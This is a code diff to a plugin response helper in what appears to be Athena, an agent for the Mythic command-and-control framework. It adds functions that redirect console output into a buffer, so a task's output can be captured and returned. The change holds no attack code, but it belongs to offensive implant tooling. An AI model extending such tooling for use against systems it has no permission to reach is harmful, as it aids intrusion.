@@ -1,6 +1,7 @@
 ﻿using Athena.Models;
 using Athena.Models.Mythic.Tasks;
 using System.Collections.Concurrent;
+using System.Runtime.CompilerServices;
 
 namespace Athena.Plugins
 {
@@ -10,7 +11,10 @@ namespace Athena.Plugins
         private static ConcurrentDictionary<string, ProcessResponseResult> processResults = new ConcurrentDictionary<string, ProcessResponseResult>();
         private static ConcurrentDictionary<string, FileBrowserResponseResult> fileBrowserResults = new ConcurrentDictionary<string, FileBrowserResponseResult>();
         public static ConcurrentDictionary<string, MythicJob> activeJobs = new ConcurrentDictionary<string, MythicJob>();
-
+        private static StringWriter sw = new StringWriter();
+        private static bool stdOutIsMonitored = false;
+        private static string monitoring_task = "";
+        private static TextWriter origStdOut;
         public static void AddResponse(ResponseResult res)
         {
             if (responseResults.ContainsKey(res.task_id))
@@ -112,12 +116,10 @@ namespace Athena.Plugins
         {
             WriteLine(output, task_id, completed, "");
         }
-
         public static void Write(string? output, string task_id, bool completed)
         {
             Write(output, task_id, completed, "");
         }
-
         public static async Task<List<string>> GetResponses()
         {
             List<string> results = new List<string>();
@@ -150,6 +152,49 @@ namespace Athena.Plugins
             responseResults.Clear();
             processResults.Clear();
             return results;
+        }
+        public static bool CaptureStdOut(string task_id)
+        {
+            if (stdOutIsMonitored)
+            {
+                return false;
+            }
+            try
+            {
+                monitoring_task = task_id;
+                origStdOut = Console.Out;
+                Console.SetOut(sw);
+                stdOutIsMonitored = true;
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        public static void ReleaseStdOut()
+        {
+            stdOutIsMonitored = false;
+            Console.SetOut(origStdOut);
+        }
+
+        public static bool StdIsBusy()
+        {
+            return stdOutIsMonitored;
+        }
+        public static string StdOwner()
+        {
+            return monitoring_task;
+        }
+        public async static Task<string> GetStdOut()
+        {
+            await sw.FlushAsync();
+            string output = sw.GetStringBuilder().ToString();
+
+            //Clear the writer
+            sw.GetStringBuilder().Clear();
+            return output;
         }
     }
 }
